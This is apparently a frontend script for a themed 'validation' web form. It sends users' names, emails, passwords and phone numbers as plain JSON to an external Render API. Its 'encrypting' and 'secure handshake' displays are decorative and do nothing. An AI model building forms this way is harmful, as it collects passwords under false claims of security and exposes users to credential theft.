// ============================================================
// JARVIS V7 — Frontend Script for Cloudflare Pages
// Calls Render API: https://validation-x-command-center.onrender.com
// ============================================================

const API_BASE = 'https://validation-x-command-center.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const cursorCrosshair = document.getElementById('cursorCrosshair');
    const cursorDot = document.getElementById('cursorDot');
    const mainPanel = document.getElementById('mainPanel');
    const neuralFeed = document.getElementById('neuralFeed');
    const packetLog = document.getElementById('packetLog');
    const systemLog = document.getElementById('systemLog');
    const form = document.getElementById('validationForm');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');

    // --- Tactical Blue Plus Cursor ---
    document.addEventListener('mousemove', (e) => {
        const { clientX: x, clientY: y } = e;
        cursorDot.style.left = x + 'px';
        cursorDot.style.top = y + 'px';
        cursorCrosshair.style.left = (x - 15) + 'px';
        cursorCrosshair.style.top = (y - 15) + 'px';
    });

    // --- Live Data Streams ---
    const hexCodes = ["0x4F", "0x9B", "0x1C", "0x8D", "0xE2", "0xA7", "0x33", "0xF1"];
    setInterval(() => {
        const code = hexCodes[Math.floor(Math.random() * hexCodes.length)];
        if (packetLog) {
            const pLine = document.createElement('div');
            pLine.textContent = `> [${code}] PACKET_RECV...`;
            packetLog.appendChild(pLine);
            if (packetLog.childNodes.length > 3) packetLog.removeChild(packetLog.firstChild);
        }
        if (systemLog) {
            systemLog.textContent = `> [${code}] SECURE_HANDSHAKE_${Math.floor(Math.random() * 1000)}`;
        }
        if (neuralFeed) {
            neuralFeed.querySelectorAll('div').forEach(bar => {
                bar.style.opacity = Math.random() * 0.8 + 0.2;
            });
        }
    }, 600);

    // --- 3D Panel Tilt ---
    if (mainPanel) {
        document.addEventListener('mousemove', (e) => {
            const x = (window.innerWidth / 2 - e.clientX) / 80;
            const y = (window.innerHeight / 2 - e.clientY) / 80;
            mainPanel.style.transform = `perspective(1000px) rotateY(${x}deg) rotateX(${y}deg)`;
        });
    }

    // --- Form Submission → Render API ---
    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (errorMsg) errorMsg.style.display = 'none';

            const fullname = document.getElementById('fullname').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const phone = document.getElementById('phone').value.trim();
            const message = document.getElementById('message').value.trim();

            // Client-side validation
            if (!fullname || !email || !password || !phone) {
                if (errorMsg) {
                    errorMsg.textContent = '> ERROR: All fields required for transmission.';
                    errorMsg.style.display = 'block';
                }
                return;
            }

            submitBtn.textContent = 'CONNECTING...';
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';

            // Animated loading states (Render cold start can take ~30s)
            const loadingStates = ['CONNECTING...', 'WAKING SERVER...', 'ENCRYPTING DATA...', 'UPLOADING PAYLOAD...', 'DISPATCHING EMAIL...'];
            let stateIdx = 0;
            const loadingInterval = setInterval(() => {
                stateIdx = (stateIdx + 1) % loadingStates.length;
                submitBtn.textContent = loadingStates[stateIdx];
            }, 5000);

            try {
                const response = await fetch(`${API_BASE}/validate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fullname, email, password, phone, message })
                });

                clearInterval(loadingInterval);
                const data = await response.json();

                if (data.success) {
                    submitBtn.textContent = 'MISSION ACCEPTED';
                    submitBtn.style.background = '#fff';
                    submitBtn.style.color = '#000';
                    sessionStorage.setItem('missionData', JSON.stringify({ fullname: data.fullname, message: data.message }));
                    setTimeout(() => { window.location.href = '/success.html'; }, 800);
                } else {
                    if (errorMsg) {
                        errorMsg.textContent = `> ERROR: ${data.error}`;
                        errorMsg.style.display = 'block';
                    }
                    submitBtn.textContent = 'Initiate Deployment';
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                }
            } catch (err) {
                clearInterval(loadingInterval);
                if (errorMsg) {
                    errorMsg.textContent = '> ERROR: Server is waking up. Please try again in 30 seconds.';
                    errorMsg.style.display = 'block';
                }
                submitBtn.textContent = 'Initiate Deployment';
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
        });
    }
});
